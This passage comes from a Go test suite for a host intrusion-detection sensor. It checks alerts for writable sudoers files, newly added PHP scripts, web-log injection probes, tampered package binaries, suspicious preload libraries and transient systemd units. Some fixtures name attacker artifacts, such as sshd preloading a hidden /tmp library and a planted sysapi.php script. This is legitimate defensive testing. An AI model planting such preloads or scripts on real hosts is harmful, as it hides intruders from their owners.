	for _, want := range []string{"Every user on the server can write to it (mode 777)", "rename or replace", "/etc/sudoers", "chmod 755 /", "Collected data: owner 0, group 0, mode drwxrwxrwx."} {
		if !strings.Contains(root, want) {
			t.Errorf("detail of / lacks %q:\n%s", want, root)
		}
	}
	group := policyWriteDetail(collector.File{Path: "/etc/sudoers.d/ops", UID: &u0, GID: &u1000, Mode: "-rw-rw-r--"}, trusted, acc)
	for _, want := range []string{"The group deploy (GID 1000) can write to it, and its members are deploy", "chmod 440 /etc/sudoers.d/ops"} {
		if !strings.Contains(group, want) {
			t.Errorf("detail of a group-writable file lacks %q:\n%s", want, group)
		}
	}
	if octal("rwxr-x---") != "750" || octal("rwsr-xr-x") != "755" {
		t.Error("octal")
	}
}

// Scripts added or changed are named; a deploy of many files gives one alert, and files that are
// not scripts only show in the directory's change.
func TestScriptChanges(t *testing.T) {
	app := func(changes ...web.FileChange) *web.Result {
		return &web.Result{Apps: []web.AppReport{{
			Application: discovery.Application{Path: "/var/www/shop"},
			DirHashes:   map[string]string{"/var/www/shop/vendor": "b"},
			Changes:     changes, ChangeCount: len(changes),
		}}}
	}
	prev := &State{Web: &web.Result{Apps: []web.AppReport{{Application: discovery.Application{Path: "/var/www/shop"}, DirHashes: map[string]string{"/var/www/shop/vendor": "a"}}}}}
	got := map[string]Finding{}
	for _, f := range Evaluate(prev, State{Web: app(
		web.FileChange{Path: "/var/www/shop/pub/sysapi.php", Change: web.ChangeAdded, SHA256: "aa"},
		web.FileChange{Path: "/var/www/shop/vendor/acme/App/View.php", Change: web.ChangeModified, SHA256: "bb"},
		web.FileChange{Path: "/var/www/shop/vendor/acme/App/Old.php", Change: web.ChangeRemoved},
		web.FileChange{Path: "/var/www/shop/vendor/acme/etc/di.xml", Change: web.ChangeModified},
	)}) {
		got[f.Fingerprint] = f
	}
	if f := got["web-change:file:/var/www/shop/pub/sysapi.php:aa"]; f.Severity != "high" || f.Title != "Script added: /var/www/shop/pub/sysapi.php" {
		t.Errorf("new script: %+v", f)
	}
	if f := got["web-change:file:/var/www/shop/vendor/acme/App/View.php:bb"]; f.Severity != "high" {
		t.Errorf("changed core file: %+v", f)
	}
	if f := got["web-change:code:/var/www/shop/vendor:b"]; !strings.Contains(f.Detail, "modified /var/www/shop/vendor/acme/etc/di.xml") || !strings.Contains(f.Detail, "removed /var/www/shop/vendor/acme/App/Old.php") {
		t.Errorf("directory change does not name its files: %q", f.Detail)
	}
	if len(got) != 3 {
		t.Errorf("findings: %v", got)
	}

	var deploy []web.FileChange
	for i := 0; i < 300; i++ {
		deploy = append(deploy, web.FileChange{Path: fmt.Sprintf("/var/www/shop/vendor/acme/F%d.php", i), Change: web.ChangeModified, SHA256: "cc"})
	}
	n := 0
	for _, f := range Evaluate(prev, State{Web: app(deploy...)}) {
		if strings.HasPrefix(f.Fingerprint, "web-change:scripts:") {
			n++
		}
		if strings.HasPrefix(f.Fingerprint, "web-change:file:") {
			t.Fatalf("a deploy raised one alert per file: %s", f.Fingerprint)
		}
	}
	if n != 1 {
		t.Errorf("deploy alerts: %d", n)
	}
}

// A medium log event aimed at the application's weak points is one alert a day per rule and log,
// however many requests and scripts it spans; the scans every site receives raise nothing.
func TestWeblogAttemptsDaily(t *testing.T) {
	cur := baseState()
	cur.TakenAt = time.Date(2026, 10, 28, 15, 0, 0, 0, time.UTC)
	ev := func(rule, uri string) logs.Event {
		return logs.Event{Rule: rule, Severity: "medium", Method: "POST", Status: 404, Log: "/var/log/nginx/access.log", Evidence: logs.AttackerControlled{Request: uri}}
	}
	cur.Weblog = &logs.Result{Events: []logs.Event{
		ev("shipping_estimate_probe", "/rest/V1/guest-carts/a/estimate-shipping-methods"),
		ev("shipping_estimate_probe", "/index.php/rest/V1/guest-carts/b/estimate-shipping-methods"),
		ev("sql_injection", "/p?id=[redacted]"),
		ev("injection_probe", "/"),
	}}
	var got []string
	for _, f := range Evaluate(nil, cur) {
		if f.Kind == "weblog" {
			got = append(got, f.Severity+" "+f.Fingerprint)
		}
	}
	if want := []string{"medium weblog:shipping_estimate_probe:/var/log/nginx/access.log|2026-10-28"}; !slices.Equal(got, want) {
		t.Errorf("weblog findings = %v, want %v", got, want)
	}
}

// Files under /var that a package installed are rewritten by the programs that use them; files
// elsewhere are not.
func TestModifiedPackageFilesUnderVar(t *testing.T) {
	cur := baseState()
	cur.Packages = &system.PackagesResult{Modified: []system.ModifiedFile{{Path: "/var/lib/pear/.channels/pecl.php.net.reg", Package: "php-pear"}, {Path: "/usr/bin/ls", Package: "coreutils"}}}
	got := fingerprints(Evaluate(nil, cur))
	if !slices.Contains(got, "high packages:modified:/usr/bin/ls") || slices.ContainsFunc(got, func(f string) bool { return strings.Contains(f, "pear") }) {
		t.Errorf("findings = %v", got)
	}
}

// A program preloading its vendor's own allocator, or a library of the system, is not hiding;
// a preload from anywhere else is.
func TestVendorPreload(t *testing.T) {
	for _, c := range []struct {
		exe, preload string
		want         bool
	}{
		{"/opt/unified-monitoring-agent/embedded/bin/ruby", "/opt/unified-monitoring-agent/embedded/lib/libjemalloc.so", true},
		{"/usr/bin/redis-server", "/usr/lib/x86_64-linux-gnu/libjemalloc.so.2", true},
		{"/opt/agent/bin/a", "/opt/other/lib/x.so", false},
		{"/usr/sbin/sshd", "/tmp/.x/libhide.so", false},
		{"/opt/agent/bin/a", "/opt/agent/lib/x.so:/dev/shm/y.so", false},
		{"/usr/bin/x", "/usr/lib/../../tmp/y.so", false},
	} {
		if got := vendorPreload(c.exe, c.preload); got != c.want {
			t.Errorf("%s with %s: %v, want %v", c.exe, c.preload, got, c.want)
		}
	}
	if !vendorConfig("/opt/unified-monitoring-agent/etc/systemd/unit.conf") || vendorConfig("/opt/agent/bin/agent") || vendorConfig("/etc/opt/x") {
		t.Error("vendorConfig")
	}
}

// A root-owned binary in a snap's data directory is a cloud agent's plugin, reported only when it
// appears or changes; elsewhere one with file capabilities is named for what it has.
func TestPrivilegedFilesInSnapData(t *testing.T) {
	uid0, uid33 := uint32(0), uint32(33)
	cur := State{Privileged: &system.PrivilegedResult{Files: []collector.File{
		{Path: "/var/snap/cloud-agent/common/plugin", Mode: "-rwxr-xr-x", UID: &uid0, GID: &uid0, SHA256: "aa", Attrs: collector.Attrs{Capabilities: true}},
		{Path: "/var/snap/cloud-agent/common/mine", Mode: "urwxr-xr-x", UID: &uid33, GID: &uid33, SHA256: "bb"},
		{Path: "/srv/tool", Mode: "-rwxr-xr-x", UID: &uid0, GID: &uid0, SHA256: "cc", Attrs: collector.Attrs{Capabilities: true}},
	}}}
	prev := State{Privileged: &system.PrivilegedResult{}}
	titles := map[string]string{}
	for _, f := range Evaluate(&prev, cur) {
		titles[f.Severity+" "+f.Fingerprint] = f.Title
	}
	for _, want := range []string{
		"high privileged-change:new:root|/var/snap/cloud-agent/common/plugin:aa",
		"critical privileged:setid:uid 33|/var/snap/cloud-agent/common/mine",
		"critical privileged:setid:root|/srv/tool",
	} {
		if _, ok := titles[want]; !ok {
			t.Errorf("missing %s in %v", want, titles)
		}
	}
	if _, ok := titles["critical privileged:setid:root|/var/snap/cloud-agent/common/plugin"]; ok {
		t.Error("a root-owned file in snap data is reported as unusual")
	}
	if got := titles["critical privileged:setid:root|/srv/tool"]; got != "Binary with file capabilities in an unusual directory: /srv/tool" {
		t.Errorf("title %q", got)
	}
}

// A collector cut short by the sensor stopping, for an update, is not a collector failing; the
// transient unit a signed update runs in is the sensor's own, and only that one.
func TestSensorUpdateLeavesNoAlerts(t *testing.T) {
	exec := []string{"ExecStart=", `ExecStart="/usr/bin/tripwatch-sensor" "-apply-update" "-bundle" "/etc/tripwatch/bundle.json" "-state-dir" "/var/lib/tripwatch"`}
	prev := State{Services: &system.ServicesResult{}}
	cur := State{
		Errors: map[string]string{"kernel": "kernel: context canceled after 15m0s", "web": "web: context deadline exceeded after 15m0s"},
		Services: &system.ServicesResult{Units: []system.Unit{
			{File: collector.File{Path: "/run/systemd/transient/tripwatch-sensor-update.service"}, Exec: exec},
			{File: collector.File{Path: "/run/systemd/transient/tripwatch-sensor-uninstall.service"}, Exec: []string{`ExecStart="/tmp/tripwatch-sensor" "-apply-uninstall" "-bundle" "/b" "-state-dir" "/s"`}},
			{File: collector.File{Path: "/run/systemd/transient/run-x.service"}, Exec: exec},
		}},
	}
	got := fingerprints(Evaluate(&prev, cur))
	want := []string{
		"medium persistence-change:unit:root|/run/systemd/transient/run-x.service",
		"medium persistence-change:unit:root|/run/systemd/transient/tripwatch-sensor-uninstall.service",
		"medium sensor:error:web",
	}
	if !slices.Equal(got, want) {
		t.Errorf("findings = %v, want %v", got, want)
	}
}
